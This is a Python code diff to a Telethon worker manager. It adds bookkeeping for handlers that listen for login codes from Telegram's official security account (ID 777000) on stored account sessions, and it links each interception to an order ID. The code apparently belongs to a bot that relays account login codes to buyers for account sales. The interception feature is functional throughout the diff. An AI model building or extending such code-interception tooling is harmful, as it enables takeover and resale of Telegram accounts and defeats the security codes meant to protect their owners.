@@ -63,6 +63,7 @@ class TelethonWorkerManager:
     def __init__(self, auth_code_callback=None):
         self.encryptor = TelegramSessionEncryptor()
         self.active_clients: Dict[str, TelegramClient] = {}
+        self.active_interception_handlers: Dict[str, Any] = {}
         self.auth_code_callback = auth_code_callback  # Callback to notify aiogram bot of incoming code
 
     def _get_client(self, phone: str, api_id: int, api_hash: str, session_str_decrypted: str) -> TelegramClient:
@@ -146,7 +147,7 @@ class TelethonWorkerManager:
             # Keep client connected to hear purchase codes, but if cleaning failed due to invalid session we disconnect
             pass
 
-    async def start_login_code_interception(self, phone: str, api_id: int, api_hash: str, encrypted_session: str, order_id: int):
+    async def start_login_code_interception(self, phone: str, api_id: int, api_hash: str, encrypted_session: str, order_id: int) -> bool:
         """
         Activates real-time event listener to catch incoming codes from Telegram (user id 777000)
         and passes the results back to the core Bot UI.
@@ -162,7 +163,15 @@ class TelethonWorkerManager:
 
         if not await client.is_user_authorized():
             logger.error(f"Interception failed because account {phone} is not logged in!")
-            return
+            return False
+
+        old_handler = self.active_interception_handlers.get(phone)
+        if old_handler:
+            try:
+                client.remove_event_handler(old_handler)
+                logger.info(f"Removed previous Telegram code interception handler for: {phone}")
+            except Exception as e:
+                logger.warning(f"Failed to remove previous interception handler for {phone}: {e}")
 
         @client.on(events.NewMessage(chats=777000)) # ID 777000 is always Telegram Official Security Service
         async def handler(event):
@@ -187,11 +196,19 @@ class TelethonWorkerManager:
             else:
                 logger.warning(f"Intercepted message from Telegram official post, but no 5-6 digit code matched.")
 
-        logger.info(f"Interception active and listening on Telethon client events for: {phone}")
+        self.active_interception_handlers[phone] = handler
+        logger.info(f"Interception active for order {order_id} and listening on Telethon client events for: {phone}")
+        return True
 
     async def stop_interception(self, phone: str):
         if phone in self.active_clients:
             client = self.active_clients[phone]
+            handler = self.active_interception_handlers.pop(phone, None)
+            if handler:
+                try:
+                    client.remove_event_handler(handler)
+                except Exception as e:
+                    logger.warning(f"Failed to remove interception handler while stopping {phone}: {e}")
             await client.disconnect()
             del self.active_clients[phone]
             logger.info(f"Disconnected and removed Telethon listener client for phone: {phone}")
